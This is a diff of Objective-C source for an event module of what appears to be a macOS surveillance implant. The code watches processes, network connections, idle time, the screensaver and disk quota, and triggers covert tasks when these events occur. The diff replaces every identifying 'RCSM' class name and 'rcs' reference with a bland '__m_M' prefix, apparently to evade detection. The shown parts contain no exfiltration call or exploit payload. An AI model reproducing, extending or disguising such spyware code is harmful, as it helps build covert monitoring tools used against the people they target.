@@ -50,12 +50,12 @@
 
 extern NSString *RCSMaxLogQuotaReached;
 
-static RCSMEvents *sharedEvents = nil;
+static __m_MEvents *sharedEvents = nil;
 static NSMutableArray *connectionsDetected = nil;
 NSLock *connectionLock;
 
 
-@implementation RCSMEvents
+@implementation __m_MEvents
 
 @synthesize mEventQuotaRunning;
 
@@ -63,7 +63,7 @@ NSLock *connectionLock;
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMEvents *)sharedEvents
++ (__m_MEvents *)sharedEvents
 {
   @synchronized(self)
   {
@@ -193,7 +193,7 @@ NSLock *connectionLock;
                  maxDate:(NSDate*)aDate
         andConfiguration:(NSDictionary*)configuration
 {
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   if (anAction == 0xFFFFFFFF)
     return;
@@ -226,7 +226,7 @@ NSLock *connectionLock;
             andIteration:(int)iter
         andConfiguration:(NSDictionary*)configuration
 {
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   
   if (anAction == 0xFFFFFFFF)
     return FALSE;
@@ -252,7 +252,7 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   NSDate *startThreadDate = [[NSDate date] retain];
   timerStruct *timerRawData;
   NSTimeInterval interval = 0;
@@ -280,7 +280,7 @@ NSLock *connectionLock;
       
       switch (type)
         {
-          // never in rcs8
+          // never in __m_8
           case TIMER_AFTER_STARTUP:
             {
               interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
@@ -501,7 +501,7 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   NSString *process = nil;
   int processAlreadyFound = 0;
   processStruct *processRawData;
@@ -820,7 +820,7 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   char mibName[] = "net.inet.tcp.pcblist";
   connectionStruct *connectionRawData;
   BOOL connectionFound;
@@ -1042,7 +1042,7 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];  
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];  
   BOOL screenSaverFound = FALSE;
   int onTermination;
     
@@ -1117,7 +1117,7 @@ NSLock *connectionLock;
 #ifdef DEBUG_EVENTS
     infoLog(@"event quota triggering action %@", actionId);
 #endif
-      [[RCSMTaskManager sharedInstance] triggerAction: [actionId intValue]];
+      [[__m_MTaskManager sharedInstance] triggerAction: [actionId intValue]];
     }
 }
 
@@ -1143,26 +1143,26 @@ typedef struct {
   int currentIter = iter;
   
   // Setting parameter
-  [[RCSMDiskQuota sharedInstance] setEventQuotaParam: configuration 
+  [[__m_MDiskQuota sharedInstance] setEventQuotaParam: configuration 
                                            andAction: [configuration objectForKey:@"actionID"]];
                                            
   while ([configuration objectForKey: @"status"] != EVENT_STOP
          && [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
-      if (mEventQuotaRunning == NO && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
+      if (mEventQuotaRunning == NO && [[__m_MDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
         {
           mEventQuotaRunning = YES;
           
           if ([self isEventEnable: configuration] == TRUE)
-            [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
+            [[__m_MTaskManager sharedInstance] triggerAction: enterAction];
           currentIter = 0;
         }
         
-      if (mEventQuotaRunning == YES && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == NO)
+      if (mEventQuotaRunning == YES && [[__m_MDiskQuota sharedInstance] mMaxQuotaTriggered] == NO)
         {
           mEventQuotaRunning = NO;
           if ([self isEventEnable: configuration] == TRUE)
-            [[RCSMTaskManager sharedInstance] triggerAction: exitAction];
+            [[__m_MTaskManager sharedInstance] triggerAction: exitAction];
         }
     
       if (mEventQuotaRunning == TRUE)
@@ -1171,7 +1171,7 @@ typedef struct {
               [self waitDelaySeconds:configuration] == FALSE &&
               [self isEventEnable: configuration] == TRUE)
             {
-              [[RCSMTaskManager sharedInstance] triggerAction: repeat];
+              [[__m_MTaskManager sharedInstance] triggerAction: repeat];
               currentIter++;
             }
         }
@@ -1270,7 +1270,7 @@ typedef struct {
               infoLog(@"%s: triggering idle start %d", __FUNCTION__, enterAction);
 #endif
               idleTriggered = TRUE;
-              [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
+              [[__m_MTaskManager sharedInstance] triggerAction: enterAction];
               currentIter = 0;
             }
         }
@@ -1282,7 +1282,7 @@ typedef struct {
 #ifdef DEBUG_EVENTS
               infoLog(@"%s: triggering idle stop %d", __FUNCTION__, end);
 #endif
-              [[RCSMTaskManager sharedInstance] triggerAction: end];
+              [[__m_MTaskManager sharedInstance] triggerAction: end];
               idleTriggered = FALSE;
             }
         }
@@ -1296,7 +1296,7 @@ typedef struct {
 #ifdef DEBUG_EVENTS
               infoLog(@"%s: triggering idle repeat %d", __FUNCTION__, repeat);
 #endif
-              [[RCSMTaskManager sharedInstance] triggerAction: repeat];
+              [[__m_MTaskManager sharedInstance] triggerAction: repeat];
               currentIter++;
             }
         }
